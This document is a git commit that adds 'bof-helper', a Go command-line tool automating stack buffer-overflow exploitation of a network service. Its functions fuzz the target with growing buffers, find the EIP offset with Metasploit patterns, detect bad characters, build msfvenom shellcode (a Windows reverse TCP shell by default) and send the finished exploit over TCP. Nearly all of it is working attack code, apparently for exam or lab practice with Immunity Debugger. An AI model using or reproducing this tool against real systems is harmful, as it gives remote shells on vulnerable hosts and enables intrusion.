cbea024b61658b8029091ce52337aef1cbe5b6dc
Chris <tacashix@gmail.com>
2021-01-15 12:06:40 +0100

    initial commit

---
+++ funcs.go
@@ -0,0 +1,231 @@
+package main
+
+import (
+	"bufio"
+	"encoding/hex"
+	"encoding/json"
+	"fmt"
+	"io/ioutil"
+	"log"
+	"net"
+	"os"
+	"os/exec"
+	"path"
+	"strconv"
+	"strings"
+	"time"
+)
+
+//Config struct
+type Config struct {
+	Host    string `json:"host"`
+	Port    int    `json:"port"`
+	Cmd     string `json:"cmd"`
+	MsfPath string `json:"msf-path"`
+	Timeout int    `json:"timeout"`
+}
+
+//Exploit struct
+type Exploit struct {
+	Jmp     string `json:"jmp"`
+	Offset  int    `json:"off"`
+	Payload string `json:"payload"`
+}
+
+func saveConfig(s interface{}, filename string) error {
+	bytes, err := json.MarshalIndent(s, "", "  ")
+	if err != nil {
+		return err
+	}
+	p, _ := os.Getwd()
+	return ioutil.WriteFile(path.Join(p, filename), bytes, 0644)
+}
+
+func loadConfig(filename string) (interface{}, error) {
+	p, _ := os.Getwd()
+	bytes, err := ioutil.ReadFile(path.Join(p, filename))
+	if err != nil {
+		return nil, err
+	}
+	switch filename {
+	case "bof-config.json":
+		var c Config
+		err = json.Unmarshal(bytes, &c)
+		if err != nil {
+			return nil, err
+		}
+		if c.Cmd != "" {
+			c.Cmd += " "
+		}
+		return c, nil
+	case "bof-exploit.json":
+		var e Exploit
+		err = json.Unmarshal(bytes, &e)
+		if err != nil {
+			return nil, err
+		}
+		return e, nil
+	}
+	return nil, nil
+}
+
+func fuzz(c Config, t int) int {
+	// Payload: cmd + buffer filled with A. Increasing by 100
+	fmt.Printf("Fuzzing %s:%d using command: %s and timeout: %d"+"\r\n", c.Host, c.Port, c.Cmd, t)
+	count := 100
+	for {
+		fmt.Println("Sending buffer of size", count, "...")
+		err := sendPayload(c, fmt.Sprintf(c.Cmd+strings.Repeat("A", count)))
+		if err != nil {
+			if count == 100 {
+				log.Fatal(err)
+			}
+			return count - 100
+		}
+		count += 100
+		time.Sleep(time.Duration(t) * time.Second)
+	}
+}
+
+func offset(c Config, n int, v bool) int {
+	//Generate Pattern
+	fmt.Println("Generating pattern of length", n+400, "...")
+	patternCmd := path.Join(c.MsfPath, "tools/exploit/pattern_create.rb")
+	pattern, err := exec.Command(patternCmd, "-l", strconv.Itoa(n+400)).Output()
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	//Send payload
+	fmt.Printf("Sending payload to %s:%d with command: %s..."+"\n", c.Host, c.Port, c.Cmd)
+	//err = sendPayload(c, fmt.Sprintf("%s %s", c.Cmd, pattern))
+	err = sendPayload(c, fmt.Sprintf("%s", pattern))
+	if err != nil {
+		log.Fatal(err)
+	}
+	fmt.Println("Mona command to detect offset:" + "\n")
+	fmt.Printf("!mona findmsp -distance %d"+"\n", n+400)
+
+	//Verify
+	if v {
+		var offset int
+		fmt.Print("Enter mona offset:")
+		fmt.Scanf("%d", &offset)
+
+		payload := fmt.Sprintf(c.Cmd + strings.Repeat("A", offset) + "BBBB")
+		fmt.Print("Restart app in immunity debugger and press ENTER to continue...")
+		bufio.NewReader(os.Stdin).ReadBytes('\n')
+		fmt.Println("Sending payload...")
+		err = sendPayload(c, payload)
+		if err != nil {
+			log.Fatal(err)
+		}
+		fmt.Println("Finding offset was successful if EIP register shows 42424242")
+		return offset
+	}
+	return 0
+}
+
+func badchars(c Config, o int, b string, r bool) {
+	//Generate badchars payload
+	fmt.Println("Generating Payload...")
+	badstring := ""
+	bad := strings.Split(b, "\\x")
+
+OUTER:
+	for i := 0; i < 256; i++ {
+		currByte := fmt.Sprintf("%02x", i)
+		for _, char := range bad {
+			if currByte == char {
+				continue OUTER
+			}
+		}
+		badstring += currByte
+	}
+	decoded, _ := hex.DecodeString(badstring)
+	fmt.Println("Bytearray size:", len(decoded))
+
+	//Assemble and send payload
+	payload := fmt.Sprintf(c.Cmd + strings.Repeat("A", o) + string(decoded))
+	fmt.Printf("Sending payload to %s:%d with command: %s..."+"\n", c.Host, c.Port, c.Cmd)
+	err := sendPayload(c, payload)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+	//recurse flag
+	if r {
+		fmt.Print("Enter detected badchars or q to quit: ")
+		fmt.Scanf("%s", &b)
+		if b != "q" {
+			fmt.Println("Running badchars again")
+			badchars(c, o, b, r)
+		}
+
+	}
+
+}
+
+func generate(c Config, off int, jmp string, bad string, ptype string, send bool, ip string, port int) {
+	//Execute msfvenom
+	fmt.Println("Generating msfvenom payload...")
+	venomCmd := path.Join(c.MsfPath, "msfvenom")
+	venomArgs := fmt.Sprintf("-p %s LHOST=%s LPORT=%d EXITFUNC=thread -b \"%s\" -f hex -o payload.txt", ptype, ip, port, bad)
+	_, err := exec.Command(venomCmd, venomArgs).Output()
+	if err != nil {
+		log.Fatal(err)
+	}
+	//read msfvenom output
+	p, _ := os.Getwd()
+	payload, err := ioutil.ReadFile(path.Join(p, "payload.txt"))
+	if err != nil {
+		log.Fatal(err)
+	}
+	//delete txt file
+	_, err = exec.Command("rm", "payload.txt").Output()
+	if err != nil {
+		log.Fatal(err)
+	}
+	//make json
+	e := Exploit{Jmp: jmp, Offset: off, Payload: string(payload)}
+
+	err = saveConfig(e, "bof-exploit.json")
+	if err != nil {
+		log.Fatal(err)
+	}
+	//send if flag set
+	if send {
+		execute(c, e)
+	}
+}
+
+func execute(c Config, e Exploit) {
+	fmt.Printf("Sending exploit to %s:%d..."+"\n", c.Host, c.Port)
+	decoded, _ := hex.DecodeString(e.Payload)
+	payload := fmt.Sprintf(c.Cmd+strings.Repeat("A", e.Offset)+e.Jmp, strings.Repeat("\x90", 16)+string(decoded))
+	err := sendPayload(c, payload)
+	if err != nil {
+		log.Fatal(err)
+	}
+}
+
+func sendPayload(conf Config, payload string) error {
+	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", conf.Host, conf.Port))
+	conn.SetDeadline(time.Now().Add(time.Duration(conf.Timeout) * time.Second))
+	defer conn.Close()
+	if err != nil {
+		return err
+	}
+
+	reply := make([]byte, 1024)
+	_, err = conn.Read(reply)
+	if err != nil {
+		return err
+	}
+	_, err = fmt.Fprintf(conn, payload+"\r\n")
+	if err != nil {
+		return err
+	}
+
+	return nil
+}
---
+++ main.go
@@ -0,0 +1,230 @@
+package main
+
+import (
+	"fmt"
+	"log"
+	"os"
+
+	"github.com/urfave/cli/v2"
+)
+
+func main() {
+	configName := "bof-config.json"
+	app := &cli.App{
+		Name:                 "bof-helper",
+		Usage:                "Makes developing buffer overflows with Immunity Debugger and Mona slightly more convenient.",
+		EnableBashCompletion: true,
+		Commands: []*cli.Command{
+			{
+				Name:  "set",
+				Usage: "saves ip, port, command and metasploit path to config file.",
+				Flags: []cli.Flag{
+					&cli.StringFlag{
+						Name:     "ip",
+						Aliases:  []string{"i"},
+						Usage:    "Immunity Debugger host `IP`",
+						Required: true,
+					},
+					&cli.IntFlag{
+						Name:     "port",
+						Aliases:  []string{"p"},
+						Usage:    "Immunity Debugger app  `PORT`",
+						Required: true,
+					},
+					&cli.IntFlag{
+						Name:    "timeout",
+						Aliases: []string{"t"},
+						Usage:   "Connection timeout",
+						Value:   5,
+					},
+					&cli.StringFlag{
+						Name:    "cmd",
+						Aliases: []string{"c"},
+						Value:   "",
+						Usage:   "Vulnerable app command",
+					},
+					&cli.StringFlag{
+						Name:    "msfpath",
+						Aliases: []string{"m"},
+						Value:   "/usr/share/metasploit-framework",
+						Usage:   "metasploit framework path",
+					},
+				},
+				Action: func(c *cli.Context) error {
+					conf := Config{Host: c.String("ip"), Port: c.Int("port"), Cmd: c.String("cmd"), MsfPath: c.String("msfpath")}
+					saveConfig(conf, configName)
+					return nil
+				},
+			},
+
+			{
+				Name:  "fuzz",
+				Usage: "sends increasingly long buffer until server stops responding",
+				Flags: []cli.Flag{
+					&cli.IntFlag{
+						Name:    "time",
+						Aliases: []string{"t"},
+						Usage:   "Time between requests in seconds",
+						Value:   1,
+					},
+				},
+				Action: func(c *cli.Context) error {
+					conf, err := loadConfig(configName)
+					if err != nil {
+						fmt.Println("Error loading config. Please verify that bof-config.json is present and populated.")
+						log.Fatal(err)
+					}
+					size := fuzz(conf.(Config), c.Int("time"))
+					fmt.Println("Application crashed at buffer size", size)
+					return nil
+				},
+			},
+
+			{
+				Name:  "offset",
+				Usage: "sends metasploit generated pattern to detect offset",
+				Flags: []cli.Flag{
+					&cli.IntFlag{
+						Name:     "length",
+						Aliases:  []string{"l"},
+						Usage:    "Buffersize that crashed app while fuzzing",
+						Required: true,
+					},
+					&cli.BoolFlag{
+						Name:    "verify",
+						Aliases: []string{"v"},
+						Usage:   "set if you want to verify found offset",
+					},
+				},
+				Action: func(c *cli.Context) error {
+					conf, err := loadConfig(configName)
+					if err != nil {
+						fmt.Println("Error loading config. Please verify that bof-config.json is present and populated.")
+						log.Fatal(err)
+					}
+					offset(conf.(Config), c.Int("length"), c.Bool("verify"))
+					return nil
+				},
+			},
+
+			{
+				Name:  "badchars",
+				Usage: "sends payload to detect badchars",
+				Flags: []cli.Flag{
+					&cli.IntFlag{
+						Name:     "offset",
+						Aliases:  []string{"o"},
+						Usage:    "previously detected offset",
+						Required: true,
+					},
+					&cli.StringFlag{
+						Name:    "bad",
+						Aliases: []string{"b"},
+						Usage:   "detected `\"BADCHARS\"`",
+					},
+					&cli.BoolFlag{
+						Name:    "recurse",
+						Aliases: []string{"r"},
+						Usage:   "set if you want to run until all badchars have been detected",
+					},
+				},
+				Action: func(c *cli.Context) error {
+					conf, err := loadConfig(configName)
+					if err != nil {
+						fmt.Println("Error loading config. Please verify that bof-config.json is present and populated.")
+						log.Fatal(err)
+					}
+					badchars(conf.(Config), c.Int("offset"), c.String("bad"), c.Bool("recurse"))
+					return nil
+				},
+			},
+			{
+				Name:  "generate",
+				Usage: "generates buffer overflow payload",
+				Flags: []cli.Flag{
+					&cli.IntFlag{
+						Name:     "offset",
+						Aliases:  []string{"o"},
+						Usage:    "previously detected offset",
+						Required: true,
+					},
+					&cli.StringFlag{
+						Name:     "jmp",
+						Aliases:  []string{"j"},
+						Usage:    "jump point identified with mona",
+						Required: true,
+					},
+					&cli.StringFlag{
+						Name:     "badchars",
+						Aliases:  []string{"b"},
+						Usage:    "detected badchars",
+						Required: true,
+					},
+					&cli.StringFlag{
+						Name:    "payload",
+						Aliases: []string{"p"},
+						Value:   "windows/shell_reverse_tcp",
+						Usage:   "mfsvenom payload type to use",
+					},
+					&cli.StringFlag{
+						Name:     "ip",
+						Aliases:  []string{"i"},
+						Usage:    "local ip for reverse shell",
+						Required: true,
+					},
+					&cli.IntFlag{
+						Name:     "port",
+						Aliases:  []string{"p"},
+						Usage:    "local port for reverse shell",
+						Required: true,
+					},
+					&cli.BoolFlag{
+						Name:    "send",
+						Aliases: []string{"s"},
+						Usage:   "set to send payload after generating",
+					},
+				},
+				Action: func(c *cli.Context) error {
+					conf, err := loadConfig(configName)
+					if err != nil {
+						fmt.Println("Error loading config. Please verify that bof-config.json is present and populated.")
+						log.Fatal(err)
+					}
+					generate(conf.(Config), c.Int("offset"), c.String("jmp"), c.String("badchars"), c.String("payload"), c.Bool("send"), c.String("ip"), c.Int("port"))
+					return nil
+				},
+			},
+
+			{
+				Name:  "execute",
+				Usage: "executes generated payload",
+				Flags: []cli.Flag{
+					&cli.StringFlag{
+						Name:     "file",
+						Aliases:  []string{"f"},
+						Usage:    "generated payload `FILE` to execute",
+						Required: true,
+					},
+				},
+				Action: func(c *cli.Context) error {
+					conf, err := loadConfig(configName)
+					if err != nil {
+						fmt.Println("Error loading config. Please verify that bof-config.json is present and populated.")
+						log.Fatal(err)
+					}
+					e, err := loadConfig(c.String("file"))
+					if err != nil {
+						log.Fatal(err)
+					}
+					execute(conf.(Config), e.(Exploit))
+					return nil
+				},
+			},
+		},
+	}
+	err := app.Run(os.Args)
+	if err != nil {
+		log.Fatal(err)
+	}
+
+}
